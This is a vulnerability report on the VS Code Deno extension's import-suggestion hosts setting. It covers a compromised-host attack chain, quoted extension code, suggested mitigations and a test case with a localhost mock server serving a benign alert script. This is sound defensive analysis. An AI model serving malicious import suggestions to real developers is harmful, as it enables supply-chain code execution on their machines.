### Vulnerability List:

- Vulnerability Name: Malicious Import Suggestions via Compromised Hosts

- Description:
    1. An attacker compromises a domain that is configured in the `deno.suggest.imports.hosts` setting of the VS Code Deno extension.
    2. A developer has this compromised domain listed in their `deno.suggest.imports.hosts` settings.
    3. The developer is working on a JavaScript or TypeScript project with Deno enabled in VS Code.
    4. When the developer starts typing an import statement and triggers auto-completion (e.g., by typing `import {` ), the Deno extension requests import suggestions.
    5. Due to the configured `deno.suggest.imports.hosts` setting, the extension sends a request to the compromised domain for import suggestions.
    6. The attacker, controlling the compromised domain, serves malicious JavaScript or TypeScript code as import suggestions.
    7. The VS Code Deno extension displays these malicious suggestions to the developer.
    8. If the developer unknowingly selects a malicious import suggestion from the auto-completion list, the malicious code's URL is inserted into their code as an import statement.
    9. When the developer executes or type-checks this code using Deno, Deno CLI will attempt to fetch and potentially execute the malicious code from the attacker's compromised domain.
    10. This can lead to arbitrary code execution within the developer's Deno environment, potentially compromising their project and local machine, depending on the permissions granted to Deno.

- Impact:
    Successful exploitation of this vulnerability allows an attacker to inject malicious code into a developer's project. If a developer selects a malicious import suggestion, it can lead to:
    - **Arbitrary Code Execution:** The attacker's code can be executed within the developer's Deno runtime environment, potentially leading to full control over the developer's local machine and project files, depending on Deno permissions and the nature of the malicious code.
    - **Project Compromise:** Malicious code can steal sensitive information, modify project files, or introduce backdoors into the project.
    - **Supply Chain Attack:** If the compromised project is distributed, the injected malicious code can spread to other users of the project, initiating a supply chain attack.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
    - User Prompt for Registry Suggestions:
        - The extension prompts the user with an information message asking for permission to enable import suggestions from a specific origin when a registry supporting suggestions is detected. This is handled in `client\src\notification_handlers.ts` in the `createRegistryStateHandler` function and displayed using `vscode.window.showInformationMessage`.
        - This prompt includes a warning: "Only do this if you trust "${origin}"". It also provides a "Learn More" link to `docs/ImportCompletions.md`, aiming to educate users about potential risks.
        - The user's choice ("Enable" or "No") is then stored in the workspace configuration under `deno.suggest.imports.hosts`.

- Missing Mitigations:
    - Input Validation and Sanitization:
        - The extension lacks validation and sanitization of hostnames added to `deno.suggest.imports.hosts`. It should validate that the input is a valid domain name and potentially warn against or block suspicious or potentially malicious entries (e.g., IP addresses, local network addresses, or known malicious domains).
    - Content Security Policy (CSP) for Suggestions:
        - Implement a Content Security Policy (CSP) mechanism for import suggestions. This could involve:
            - A whitelist of inherently trusted domains for suggestions (e.g., deno.land).
            - Options for users to define more granular CSP rules, limiting what types of suggestions are accepted and from where.
    - User Education and Awareness:
        - While the current prompt provides a basic warning, enhance user education by:
            - Making the warning more prominent and explicit about the potential for arbitrary code execution from malicious suggestions.
            - Improving the "Learn More" documentation (`docs/ImportCompletions.md`) to clearly outline the risks of adding untrusted domains to `deno.suggest.imports.hosts` and best practices for managing this setting.
            - Consider displaying a more detailed security-focused message when users initially interact with import suggestions or the `deno.suggest.imports.hosts` setting.
    - Domain Reputation and Trust Indicators:
        - Integrate with domain reputation services to check the safety and trustworthiness of domains before suggesting imports from them. Display trust indicators to users in the suggestion list, warning them about potentially risky domains.
    - Sandboxing or Isolation for Suggestion Retrieval:
        - Isolate the process of retrieving import suggestions from the main extension process. If suggestion retrieval happens in a sandboxed environment, the impact of compromised suggestions could be limited.

- Preconditions:
    1. The VS Code Deno extension is installed and enabled.
    2. The user has explicitly enabled Deno for their workspace or project.
    3. The user has added a domain to the `deno.suggest.imports.hosts` setting, either directly or by accepting the prompt when the extension detected a registry supporting suggestions.
    4. The attacker has successfully compromised one of the domains listed in the user's `deno.suggest.imports.hosts` setting.
    5. The developer is working on a JavaScript or TypeScript file and triggers import auto-completion.

- Source Code Analysis:

    1. **Configuration Setting:** The `deno.suggest.imports.hosts` setting is defined in the `README.md` and explained in `docs/ImportCompletions.md`. It's a user-configurable setting in VS Code.

    2. **Registry State Notification Handling:** The `createRegistryStateHandler` function in `client\src\notification_handlers.ts` is responsible for handling the `deno/registryState` notification from the Deno Language Server.

    ```typescript
    // File: client\src\notification_handlers.ts
    import { RegistryStateParams } from "./lsp_extensions";
    import { NotificationHandler } from "vscode-languageclient";
    import * as vscode from "vscode";

    export function createRegistryStateHandler(): NotificationHandler<
      RegistryStateParams
    > {
      return async function handler({ origin, suggestions }) {
        if (suggestions) {
          const selection = await vscode.window.showInformationMessage(
            `The server "${origin}" supports completion suggestions for imports. Do you wish to enable this? (Only do this if you trust "${origin}") [Learn More](https://github.com/denoland/vscode_deno/blob/main/docs/ImportCompletions.md)`,
            "No",
            "Enable",
          );
          const enable = selection === "Enable";
          const suggestImportsConfig = vscode.workspace.getConfiguration(
            "deno.suggest.imports",
          );
          const hosts: Record<string, boolean> =
            suggestImportsConfig.get("hosts") ??
              {};
          hosts[origin] = enable;
          await suggestImportsConfig.update(
            "hosts",
            hosts,
            vscode.ConfigurationTarget.Workspace,
          );
        }
      };
    }
    ```

    - This handler receives `origin` (the domain) and `suggestions` (boolean indicating support).
    - If `suggestions` is true, it displays a prompt to the user asking if they want to enable suggestions for this origin.
    - Based on the user's response, it updates the `deno.suggest.imports.hosts` configuration setting in VS Code workspace settings.

    3. **Extension Initialization:** In `client\src\extension.ts`, the `clientOptions` are set up, and the `deno.suggest.imports` configuration is passed to the language server during initialization.

    ```typescript
    // File: client\src\extension.ts
    extensionContext.clientOptions = {
      // ... other options
      initializationOptions: () => {
        const denoConfiguration = vscode.workspace.getConfiguration().get(
          EXTENSION_NS,
        ) as Record<string, unknown>;
        commands.transformDenoConfiguration(extensionContext, denoConfiguration);
        return {
          ...denoConfiguration,
          javascript: vscode.workspace.getConfiguration().get("javascript"),
          typescript: vscode.workspace.getConfiguration().get("typescript"),
          enableBuiltinCommands: true,
        } as object;
      },
      // ... other options
    };
    ```
    - The `initializationOptions` function reads the `deno` section from the VS Code configuration, including `deno.suggest.imports`, and sends it to the Deno Language Server when the client starts.

    4. **Language Server Behavior (Conceptual):** While the provided files are for the VS Code client, conceptually, the Deno Language Server (not provided in these files) would:
        - Read the `deno.suggest.imports.hosts` setting from the initialization options.
        - When import auto-completion is triggered, and if a domain is configured in `deno.suggest.imports.hosts`, the Language Server would:
            - Make HTTP requests to the configured domain to fetch import suggestions.
            - Process the response from the domain and send the suggestions back to the VS Code client to display to the user.

    **Vulnerability Trigger Flow:**
    - The vulnerability is triggered when the extension, as designed, uses the domains listed in `deno.suggest.imports.hosts` to fetch import suggestions. If an attacker compromises one of these domains, they can inject malicious suggestions. The user prompt provides a basic level of consent, but it does not prevent the vulnerability if the user trusts a subsequently compromised domain.

- Security Test Case:

    1. **Setup a Mock Malicious Server:**
        - Create a simple HTTP server (e.g., using `python -m http.server` or `node static-server`) that will act as the compromised domain. Let's say this server is running locally at `http://localhost:8080`.
        - This server should be configured to respond to requests for import suggestions with a JSON payload containing malicious code suggestions. For example, when requested for suggestions, it could return:
        ```json
        [
          {
            "kind": "module",
            "name": "malicious-module",
            "insertText": "https://localhost:8080/malicious_code.js"
          }
        ]
        ```
        - Create a file `malicious_code.js` on this server that contains harmful JavaScript code (for testing purposes, this could be a simple `alert('Malicious Code Executed!')` or something that logs to console).

    2. **Configure VS Code Deno Extension:**
        - Open VS Code and go to Settings.
        - Search for "deno.suggest.imports.hosts" and edit the setting.
        - Add `localhost:8080` to the list of hosts.
        - Ensure Deno is enabled for your workspace.

    3. **Create a Test Project:**
        - Create a new Deno project or open an existing one.
        - Create a new TypeScript or JavaScript file (e.g., `test.ts`).

    4. **Trigger Auto-Completion:**
        - In `test.ts`, start typing an import statement: `import {`.
        - Wait for the auto-completion suggestions to appear.

    5. **Verify Malicious Suggestion:**
        - Check if "malicious-module" from `http://localhost:8080` appears in the import suggestions list.

    6. **Select and Insert Malicious Import:**
        - Select the "malicious-module" suggestion and press Enter to insert it into your code. Your import statement should now look like:
        ```typescript
        import { malicious_module } from "https://localhost:8080/malicious_code.js";
        ```

    7. **Run or Type-Check the Code:**
        - Try to run or type-check `test.ts` using Deno (e.g., `deno run test.ts` or simply saving the file which triggers type checking if enabled in VS Code).

    8. **Observe Malicious Code Execution (Simulated):**
        - If the setup is successful, you should observe the effect of the malicious code in `malicious_code.js`. In a real scenario, this could be arbitrary code execution. For this test case, observing the `alert('Malicious Code Executed!')` or console log confirms the vulnerability.

    9. **Cleanup:**
        - Remove `localhost:8080` from `deno.suggest.imports.hosts` setting.
        - Stop the mock malicious server.

    **Expected Result:** The test should demonstrate that by adding a domain under attacker's control to `deno.suggest.imports.hosts`, malicious import suggestions can be served and inserted into the code, which could lead to code execution when processed by Deno. This validates the "Malicious Import Suggestions via Compromised Hosts" vulnerability.
